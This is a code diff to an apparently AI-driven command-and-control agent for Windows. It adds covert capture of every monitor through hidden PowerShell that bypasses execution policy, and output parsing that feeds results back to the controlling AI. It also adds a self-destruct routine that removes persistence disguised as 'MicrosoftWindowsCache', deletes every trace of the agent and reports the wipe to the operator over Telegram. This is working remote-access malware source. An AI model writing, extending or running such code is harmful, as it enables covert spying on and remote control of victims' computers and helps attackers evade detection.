@@ -165,7 +165,7 @@ class PersistentTaskManager:
 # =============================================================================
 
 async def action_screenshot(task: PersistentTask, iteration: int) -> Optional[str]:
-    """Capture a screenshot with High-DPI and Multi-Monitor support."""
+    """Capture a FULL screenshot with proper High-DPI and Multi-Monitor support."""
     if platform.system() != "Windows":
         return None
     
@@ -174,38 +174,119 @@ async def action_screenshot(task: PersistentTask, iteration: int) -> Optional[st
         filename = f"screenshot_{task.task_id[:8]}_{timestamp}.png"
         filepath = SCREENSHOTS_DIR / filename
         
-        # Updated PowerShell script for High-DPI and Multi-Monitor support
+        # Robust PowerShell script that handles DPI scaling properly
+        # Uses Win32 API directly to get REAL screen dimensions regardless of scaling
         ps_script = f'''
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
+# Define all required Win32 APIs for proper DPI-aware screenshot
+Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+using System.Drawing;
+using System.Drawing.Imaging;
 
-# High-DPI Awareness
-$code = @'
-[DllImport("user32.dll")]
-public static extern bool SetProcessDPIAware();
-'@
-try {{
-    $win32 = Add-Type -MemberDefinition $code -Name "Win32" -Namespace Win32 -PassThru
-    $win32::SetProcessDPIAware() | Out-Null
-}} catch {{
-    # DPI Awareness might already be set or failed, continue anyway
-    Write-Host "DPI Awareness warning: $_"
+public class ScreenCapture {{
+    // DPI Awareness - must be called before any UI operations
+    [DllImport("user32.dll")]
+    public static extern bool SetProcessDPIAware();
+    
+    // Newer DPI awareness for Windows 10+
+    [DllImport("shcore.dll")]
+    public static extern int SetProcessDpiAwareness(int value);
+    
+    // Get actual screen metrics (not affected by DPI virtualization)
+    [DllImport("user32.dll")]
+    public static extern int GetSystemMetrics(int nIndex);
+    
+    // Get device caps for real DPI
+    [DllImport("gdi32.dll")]
+    public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
+    
+    // Desktop window and DC
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetDesktopWindow();
+    
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetWindowDC(IntPtr hWnd);
+    
+    [DllImport("user32.dll")]
+    public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+    
+    [DllImport("gdi32.dll")]
+    public static extern IntPtr CreateCompatibleDC(IntPtr hdc);
+    
+    [DllImport("gdi32.dll")]
+    public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
+    
+    [DllImport("gdi32.dll")]
+    public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
+    
+    [DllImport("gdi32.dll")]
+    public static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, 
+                                      IntPtr hdcSrc, int xSrc, int ySrc, int rop);
+    
+    [DllImport("gdi32.dll")]
+    public static extern bool DeleteDC(IntPtr hdc);
+    
+    [DllImport("gdi32.dll")]
+    public static extern bool DeleteObject(IntPtr hObject);
+    
+    // Virtual screen metrics for multi-monitor
+    const int SM_XVIRTUALSCREEN = 76;
+    const int SM_YVIRTUALSCREEN = 77;
+    const int SM_CXVIRTUALSCREEN = 78;
+    const int SM_CYVIRTUALSCREEN = 79;
+    const int SRCCOPY = 0x00CC0020;
+    
+    public static void CaptureScreen(string filePath) {{
+        // Set DPI awareness FIRST - try newest API, fall back to older
+        try {{ SetProcessDpiAwareness(2); }} // Per-Monitor DPI Aware
+        catch {{ SetProcessDPIAware(); }}
+        
+        // Get REAL virtual screen dimensions (all monitors combined)
+        int left = GetSystemMetrics(SM_XVIRTUALSCREEN);
+        int top = GetSystemMetrics(SM_YVIRTUALSCREEN);
+        int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+        int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+        
+        if (width == 0 || height == 0) {{
+            throw new Exception("Failed to get screen dimensions");
+        }}
+        
+        // Use GDI to capture at actual resolution
+        IntPtr desktopWnd = GetDesktopWindow();
+        IntPtr desktopDC = GetWindowDC(desktopWnd);
+        IntPtr memDC = CreateCompatibleDC(desktopDC);
+        IntPtr hBitmap = CreateCompatibleBitmap(desktopDC, width, height);
+        IntPtr oldBitmap = SelectObject(memDC, hBitmap);
+        
+        // Copy screen to memory DC
+        BitBlt(memDC, 0, 0, width, height, desktopDC, left, top, SRCCOPY);
+        
+        // Convert to managed bitmap and save
+        SelectObject(memDC, oldBitmap);
+        Bitmap bmp = Image.FromHbitmap(hBitmap);
+        bmp.Save(filePath, ImageFormat.Png);
+        
+        // Cleanup
+        bmp.Dispose();
+        DeleteObject(hBitmap);
+        DeleteDC(memDC);
+        ReleaseDC(desktopWnd, desktopDC);
+    }}
 }}
+'@
 
-# Capture VirtualScreen (covers all monitors)
-$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-
-# Copy from VirtualScreen coordinates (SourceX, SourceY) to (0,0) with specified size
-$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
-
-$bitmap.Save("{filepath}")
-$graphics.Dispose()
-$bitmap.Dispose()
+# Capture the screenshot
+try {{
+    [ScreenCapture]::CaptureScreen("{filepath}")
+    Write-Host "Screenshot saved: {filepath}"
+}} catch {{
+    Write-Error "Screenshot failed: $_"
+    exit 1
+}}
 '''
         result = subprocess.run(
-            ["powershell", "-NoProfile", "-Command", ps_script],
+            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
             capture_output=True,
             text=True,
             timeout=30,
@@ -213,10 +294,18 @@ $bitmap.Dispose()
         )
         
         if filepath.exists():
-            print(f"[SCREENSHOT] Captured: {filename}")
-            return str(filepath)
+            # Verify the file has reasonable size (not corrupted)
+            file_size = filepath.stat().st_size
+            if file_size > 1000:  # At least 1KB
+                print(f"[SCREENSHOT] Captured: {filename} ({file_size // 1024}KB)")
+                return str(filepath)
+            else:
+                print(f"[SCREENSHOT] File too small, likely corrupted: {file_size} bytes")
+                filepath.unlink()  # Delete corrupted file
+                return None
         else:
-            print(f"[SCREENSHOT] Failed: {result.stderr[:200]}")
+            error_msg = result.stderr[:300] if result.stderr else result.stdout[:300]
+            print(f"[SCREENSHOT] Failed: {error_msg}")
             return None
             
     except Exception as e:
@@ -347,6 +436,206 @@ ACTION_HANDLERS = {
     'process_check': action_process_check,
     'custom': action_custom_command,
 }
+
+
+# =============================================================================
+# ONE-TIME SCREENSHOT (for direct AI requests)
+# =============================================================================
+
+async def capture_single_screenshot() -> Tuple[str, bool]:
+    """Capture a single screenshot and return the path. Handles DPI scaling properly."""
+    if platform.system() != "Windows":
+        return "Screenshots only supported on Windows", False
+    
+    try:
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"screenshot_single_{timestamp}.png"
+        filepath = SCREENSHOTS_DIR / filename
+        
+        # Same robust capture script as persistent task
+        ps_script = f'''
+Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+using System.Drawing;
+using System.Drawing.Imaging;
+
+public class ScreenCapture {{
+    [DllImport("user32.dll")]
+    public static extern bool SetProcessDPIAware();
+    
+    [DllImport("shcore.dll")]
+    public static extern int SetProcessDpiAwareness(int value);
+    
+    [DllImport("user32.dll")]
+    public static extern int GetSystemMetrics(int nIndex);
+    
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetDesktopWindow();
+    
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetWindowDC(IntPtr hWnd);
+    
+    [DllImport("user32.dll")]
+    public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+    
+    [DllImport("gdi32.dll")]
+    public static extern IntPtr CreateCompatibleDC(IntPtr hdc);
+    
+    [DllImport("gdi32.dll")]
+    public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
+    
+    [DllImport("gdi32.dll")]
+    public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
+    
+    [DllImport("gdi32.dll")]
+    public static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, 
+                                      IntPtr hdcSrc, int xSrc, int ySrc, int rop);
+    
+    [DllImport("gdi32.dll")]
+    public static extern bool DeleteDC(IntPtr hdc);
+    
+    [DllImport("gdi32.dll")]
+    public static extern bool DeleteObject(IntPtr hObject);
+    
+    const int SM_XVIRTUALSCREEN = 76;
+    const int SM_YVIRTUALSCREEN = 77;
+    const int SM_CXVIRTUALSCREEN = 78;
+    const int SM_CYVIRTUALSCREEN = 79;
+    const int SRCCOPY = 0x00CC0020;
+    
+    public static string CaptureScreen(string filePath) {{
+        try {{ SetProcessDpiAwareness(2); }}
+        catch {{ SetProcessDPIAware(); }}
+        
+        int left = GetSystemMetrics(SM_XVIRTUALSCREEN);
+        int top = GetSystemMetrics(SM_YVIRTUALSCREEN);
+        int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+        int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+        
+        IntPtr desktopWnd = GetDesktopWindow();
+        IntPtr desktopDC = GetWindowDC(desktopWnd);
+        IntPtr memDC = CreateCompatibleDC(desktopDC);
+        IntPtr hBitmap = CreateCompatibleBitmap(desktopDC, width, height);
+        IntPtr oldBitmap = SelectObject(memDC, hBitmap);
+        
+        BitBlt(memDC, 0, 0, width, height, desktopDC, left, top, SRCCOPY);
+        
+        SelectObject(memDC, oldBitmap);
+        Bitmap bmp = Image.FromHbitmap(hBitmap);
+        bmp.Save(filePath, ImageFormat.Png);
+        
+        bmp.Dispose();
+        DeleteObject(hBitmap);
+        DeleteDC(memDC);
+        ReleaseDC(desktopWnd, desktopDC);
+        
+        return width + "x" + height;
+    }}
+}}
+'@
+
+$dims = [ScreenCapture]::CaptureScreen("{filepath}")
+Write-Host "Captured: $dims"
+'''
+        result = subprocess.run(
+            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
+            capture_output=True,
+            text=True,
+            timeout=30,
+            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
+        )
+        
+        if filepath.exists() and filepath.stat().st_size > 1000:
+            file_size = filepath.stat().st_size
+            # Extract dimensions from output
+            dims = "unknown"
+            if result.stdout and "Captured:" in result.stdout:
+                dims = result.stdout.split("Captured:")[-1].strip()
+            
+            return f"Screenshot captured: {filepath}\nResolution: {dims}\nSize: {file_size // 1024}KB", True
+        else:
+            return f"Screenshot failed: {result.stderr or result.stdout}", False
+            
+    except Exception as e:
+        return f"Screenshot error: {e}", False
+
+
+async def get_display_info() -> str:
+    """Get detailed display information including DPI scaling."""
+    if platform.system() != "Windows":
+        return "Display info only available on Windows"
+    
+    try:
+        ps_script = '''
+Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+
+public class DisplayInfo {
+    [DllImport("user32.dll")]
+    public static extern int GetSystemMetrics(int nIndex);
+    
+    [DllImport("shcore.dll")]
+    public static extern int GetDpiForMonitor(IntPtr hmonitor, int dpiType, out uint dpiX, out uint dpiY);
+    
+    [DllImport("user32.dll")]
+    public static extern IntPtr MonitorFromPoint(System.Drawing.Point pt, uint dwFlags);
+}
+'@
+
+Add-Type -AssemblyName System.Windows.Forms
+
+$output = @()
+$output += "=== DISPLAY INFORMATION ==="
+$output += ""
+
+# Get all screens
+$screens = [System.Windows.Forms.Screen]::AllScreens
+$output += "Number of monitors: $($screens.Count)"
+$output += ""
+
+foreach ($screen in $screens) {
+    $output += "--- Monitor: $($screen.DeviceName) ---"
+    $output += "  Primary: $($screen.Primary)"
+    $output += "  Bounds: $($screen.Bounds.Width)x$($screen.Bounds.Height)"
+    $output += "  Working Area: $($screen.WorkingArea.Width)x$($screen.WorkingArea.Height)"
+    $output += "  Position: ($($screen.Bounds.X), $($screen.Bounds.Y))"
+    $output += ""
+}
+
+# Virtual screen (all monitors combined)
+$output += "--- Virtual Screen (All Monitors) ---"
+$vs = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$output += "  Total Size: $($vs.Width)x$($vs.Height)"
+$output += "  Origin: ($($vs.X), $($vs.Y))"
+
+# DPI/Scaling info
+$output += ""
+$output += "--- DPI / Scaling ---"
+$graphics = [System.Drawing.Graphics]::FromHwnd([IntPtr]::Zero)
+$dpiX = $graphics.DpiX
+$dpiY = $graphics.DpiY
+$graphics.Dispose()
+
+$scaling = [math]::Round($dpiX / 96 * 100)
+$output += "  DPI: $dpiX x $dpiY"
+$output += "  Scaling: $scaling%"
+
+$output -join "`n"
+'''
+        result = subprocess.run(
+            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
+            capture_output=True,
+            text=True,
+            timeout=15,
+            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
+        )
+        
+        return result.stdout.strip() if result.stdout else f"Error: {result.stderr}"
+        
+    except Exception as e:
+        return f"Display info error: {e}"
 
 
 # =============================================================================
@@ -528,8 +817,66 @@ async def run_persistent_task(task_manager: PersistentTaskManager, task: Persist
 # STANDARD TASK HANDLERS
 # =============================================================================
 
+def analyze_output(output: str, stderr: str, returncode: int) -> Dict[str, Any]:
+    """Analyze command output to provide smarter feedback to the AI."""
+    analysis = {
+        'success': returncode == 0,
+        'has_output': bool(output.strip()),
+        'has_errors': bool(stderr.strip()),
+        'output_type': 'unknown',
+        'item_count': 0,
+        'suggestions': []
+    }
+    
+    output_lower = output.lower()
+    stderr_lower = stderr.lower()
+    
+    # Detect common error patterns
+    error_patterns = {
+        'access denied': 'ACCESS_DENIED - May need elevated privileges',
+        'not recognized': 'COMMAND_NOT_FOUND - Check command spelling',
+        'cannot find path': 'PATH_NOT_FOUND - Verify the path exists',
+        'cannot find': 'NOT_FOUND - Item does not exist',
+        'permission denied': 'PERMISSION_DENIED - Insufficient permissions',
+        'is not recognized': 'CMDLET_NOT_FOUND - Module may need importing',
+        'no such file': 'FILE_NOT_FOUND - File does not exist',
+        'timed out': 'TIMEOUT - Operation took too long',
+        'connection refused': 'CONNECTION_REFUSED - Network/service issue',
+    }
+    
+    for pattern, message in error_patterns.items():
+        if pattern in output_lower or pattern in stderr_lower:
+            analysis['error_type'] = message
+            analysis['success'] = False
+            break
+    
+    # Detect output type
+    if output.strip():
+        lines = output.strip().split('\n')
+        analysis['line_count'] = len(lines)
+        
+        # Check if it's a list/table output
+        if len(lines) > 2 and ('---' in output or all(len(l.split()) > 1 for l in lines[:3])):
+            analysis['output_type'] = 'table'
+            analysis['item_count'] = len(lines) - 1  # Subtract header
+        elif len(lines) == 1:
+            analysis['output_type'] = 'single_value'
+        else:
+            analysis['output_type'] = 'multi_line'
+        
+        # Check for file listings
+        if any(ext in output_lower for ext in ['.exe', '.pdf', '.doc', '.txt', '.zip']):
+            analysis['contains_files'] = True
+            
+        # Check for paths
+        if ':\\' in output or '/' in output:
+            analysis['contains_paths'] = True
+    
+    return analysis
+
+
 async def execute_powershell(command: str) -> Tuple[str, bool]:
-    """Execute PowerShell command."""
+    """Execute PowerShell command with smart output analysis."""
     try:
         if platform.system() == "Windows":
             result = subprocess.run(
@@ -547,16 +894,46 @@ async def execute_powershell(command: str) -> Tuple[str, bool]:
                 timeout=300,
             )
         
-        output = result.stdout.strip()
-        if result.stderr.strip():
-            output += f"\n[STDERR]: {result.stderr.strip()}"
+        # Analyze the output
+        analysis = analyze_output(result.stdout, result.stderr, result.returncode)
         
-        return output or "(no output)", result.returncode == 0
+        # Build enhanced output
+        output = result.stdout.strip()
+        
+        # Truncate very long outputs but keep useful info
+        if len(output) > 10000:
+            lines = output.split('\n')
+            if len(lines) > 100:
+                # Keep first 50 and last 20 lines
+                output = '\n'.join(lines[:50]) + f'\n\n... [{len(lines) - 70} lines truncated] ...\n\n' + '\n'.join(lines[-20:])
+            else:
+                output = output[:10000] + '\n... [output truncated]'
+        
+        # Add stderr if present
+        if result.stderr.strip():
+            stderr_truncated = result.stderr.strip()[:2000]
+            output += f"\n\n[STDERR]: {stderr_truncated}"
+        
+        # Add analysis metadata for AI
+        if not analysis['success'] and 'error_type' in analysis:
+            output += f"\n\n[ANALYSIS]: {analysis['error_type']}"
+        
+        if analysis.get('item_count', 0) > 0:
+            output += f"\n[FOUND]: {analysis['item_count']} items"
+        
+        if not output:
+            output = "(no output - command completed silently)"
+            if analysis['success']:
+                output += " [SUCCESS]"
+        
+        return output, analysis['success']
         
     except subprocess.TimeoutExpired:
-        return "Command timed out (5 min)", False
+        return "[TIMEOUT]: Command exceeded 5 minute limit. Consider breaking into smaller operations.", False
+    except FileNotFoundError:
+        return "[ERROR]: PowerShell not found. Is this a Windows system?", False
     except Exception as e:
-        return f"Execution error: {e}", False
+        return f"[EXECUTION_ERROR]: {type(e).__name__}: {e}", False
 
 
 async def install_software(url: str) -> Tuple[str, bool]:
@@ -600,16 +977,153 @@ async def install_software(url: str) -> Tuple[str, bool]:
         return f"Install error: {e}", False
 
 
+async def self_destruct() -> Tuple[str, bool]:
+    """
+    SELF DESTRUCT: Completely remove the agent from the system.
+    - Removes scheduled tasks
+    - Removes registry entries
+    - Removes startup shortcuts
+    - Deletes all files (agent, venv, data)
+    - Terminates the agent process
+    """
+    if platform.system() != "Windows":
+        return "Self-destruct only supported on Windows", False
+    
+    try:
+        print("[SELF_DESTRUCT] Initiating cleanup sequence...")
+        cleanup_report = []
+        
+        # Create a self-deleting batch script
+        batch_script = f'''@echo off
+echo [SELF_DESTRUCT] Phase 1: Stopping processes...
+timeout /t 2 /nobreak >nul
+
+REM Kill any remaining Python processes running agent.py
+taskkill /F /FI "IMAGENAME eq python.exe" /FI "WINDOWTITLE eq *agent.py*" >nul 2>&1
+taskkill /F /FI "IMAGENAME eq pythonw.exe" >nul 2>&1
+
+echo [SELF_DESTRUCT] Phase 2: Removing persistence...
+
+REM Remove Scheduled Tasks
+schtasks /Delete /TN "C2Agent" /F >nul 2>&1
+schtasks /Delete /TN "MicrosoftWindowsCache" /F >nul 2>&1
+
+REM Remove Registry Run Keys
+reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MicrosoftWindowsCache" /f >nul 2>&1
+reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MicrosoftWindowsCache" /f >nul 2>&1
+
+REM Remove Startup Shortcuts
+del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\C2Update.lnk" /f /q >nul 2>&1
+del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\C2Agent.lnk" /f /q >nul 2>&1
+
+echo [SELF_DESTRUCT] Phase 3: Deleting files...
+timeout /t 3 /nobreak >nul
+
+REM Delete installation directory
+rmdir /S /Q "{DATA_DIR.parent}" >nul 2>&1
+
+REM Delete this batch file
+del "%~f0"
+'''
+        
+        # Write the batch script to temp
+        batch_path = Path(os.environ.get('TEMP', '/tmp')) / 'cleanup_temp.bat'
+        batch_path.write_text(batch_script, encoding='utf-8')
+        
+        cleanup_report.append("✓ Cleanup script created")
+        
+        # Send final goodbye message
+        try:
+            await send_telegram_message(
+                f"💣 <b>SELF DESTRUCT EXECUTED</b>\n\n"
+                f"Node: {socket.gethostname()}\n"
+                f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+                f"All traces have been removed. Goodbye."
+            )
+            cleanup_report.append("✓ Final message sent")
+        except:
+            pass
+        
+        # Execute the batch script in the background (detached)
+        subprocess.Popen(
+            ['cmd', '/c', str(batch_path)],
+            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS if hasattr(subprocess, 'DETACHED_PROCESS') else subprocess.CREATE_NO_WINDOW,
+            close_fds=True
+        )
+        
+        cleanup_report.append("✓ Cleanup script launched")
+        
+        report = "\n".join(cleanup_report) + "\n\n💥 Self-destruct sequence initiated. Agent terminating..."
+        
+        # Give the report a moment to be sent back
+        await asyncio.sleep(1)
+        
+        # Force exit (the batch script will clean up everything)
+        os._exit(0)
+        
+    except Exception as e:
+        return f"Self-destruct error: {e}", False
+
+
 # =============================================================================
 # TASK PROCESSOR
 # =============================================================================
+
+def detect_task_success(output: str, task_type: str, command: str) -> Tuple[bool, str]:
+    """Smarter success detection based on output patterns."""
+    output_lower = output.lower()
+    
+    # Clear failure indicators
+    failure_patterns = [
+        'access denied', 'permission denied', 'not found', 'error:',
+        'failed', 'cannot find', 'unable to', 'exception', 'timeout'
+    ]
+    
+    # Check for failures first
+    for pattern in failure_patterns:
+        if pattern in output_lower:
+            # Some "not found" is actually success (e.g., searching for something that doesn't exist)
+            if 'not found' in pattern and task_type == 'shell':
+                # Check if it's an expected "not found" vs an error
+                if 'cmdlet' in output_lower or 'command' in output_lower:
+                    return False, f"Command error: {pattern}"
+            else:
+                return False, f"Detected failure pattern: {pattern}"
+    
+    # Success indicators by task type
+    if task_type == 'shell':
+        # Empty output for certain commands is success
+        if not output.strip() or output.strip() == '(no output - command completed silently) [SUCCESS]':
+            return True, "Command completed successfully (no output)"
+        # Has output = generally success
+        return True, "Command produced output"
+    
+    elif task_type == 'upload':
+        if 'uploaded' in output_lower or 'file_id' in output_lower:
+            return True, "File uploaded successfully"
+        return False, "Upload may have failed"
+    
+    elif task_type == 'install':
+        if 'successfully' in output_lower or 'installed' in output_lower:
+            return True, "Installation successful"
+        if 'already installed' in output_lower:
+            return True, "Already installed"
+        return False, "Installation status unclear"
+    
+    elif task_type == 'persistent':
+        if 'started' in output_lower:
+            return True, "Persistent task started"
+        return True, "Task registered"
+    
+    return True, "Default success"
+
 
 async def process_task(
     task: dict, 
     task_manager: PersistentTaskManager,
     report_callback
 ) -> Tuple[str, bool, Dict[str, Any]]:
-    """Process a task based on type."""
+    """Process a task based on type with smart success detection."""
     
     task_type = task.get('command_type', 'shell')
     command = task.get('command', '')
@@ -619,7 +1133,7 @@ async def process_task(
     
     print(f"[TASK] Type: {task_type}")
     if reasoning:
-        print(f"[REASON] {reasoning}")
+        print(f"[REASON] {reasoning[:100]}...")
     
     extra_data: Dict[str, Any] = {}
     
@@ -709,6 +1223,22 @@ async def process_task(
             return "\n".join(lines), True, extra_data
         else:
             return "No active persistent tasks", True, extra_data
+    
+    # === SELF DESTRUCT ===
+    elif task_type == 'self_destruct':
+        try:
+            data = json.loads(command) if command else {}
+            confirmed = data.get('confirm', False)
+            
+            if not confirmed:
+                return "Self-destruct requires explicit confirmation", False, extra_data
+            
+            # This will not return - agent will terminate
+            output, success = await self_destruct()
+            return output, success, extra_data
+            
+        except Exception as e:
+            return f"Self-destruct failed: {e}", False, extra_data
     
     else:
         return f"Unknown task type: {task_type}", False, extra_data
@@ -850,24 +1380,39 @@ async def main():
                 
                 for task in tasks:
                     task_id = task.get("id")
+                    task_type = task.get('command_type', 'shell')
+                    command = task.get('command', '')
                     
                     # Process task
-                    output, success, extra_data = await process_task(
+                    output, raw_success, extra_data = await process_task(
                         task, 
                         task_manager,
                         report_result
                     )
                     
+                    # Apply smart success detection
+                    smart_success, detection_reason = detect_task_success(output, task_type, command)
+                    final_success = raw_success and smart_success
+                    
+                    # Log detection
+                    if raw_success != smart_success:
+                        print(f"[SMART_DETECT] Override: raw={raw_success}, smart={smart_success} - {detection_reason}")
+                    
                     # Report result (unless it's a persistent task that reports later)
-                    if task.get('command_type') != 'persistent':
+                    if task_type != 'persistent':
+                        # Add detection context to output if there's a discrepancy
+                        final_output = output
+                        if not final_success and raw_success:
+                            final_output += f"\n\n[SMART_DETECT]: {detection_reason}"
+                        
                         await report_result(
                             task_id,
-                            output,
-                            'completed' if success else 'failed',
+                            final_output,
+                            'completed' if final_success else 'failed',
                             extra_data.get('file_id')
                         )
                         
-                        status_icon = "✓" if success else "✗"
+                        status_icon = "✓" if final_success else "✗"
                         print(f"[RESULT] {task_id[:8]}... → {status_icon}")
                     else:
                         # For persistent tasks, report that it started
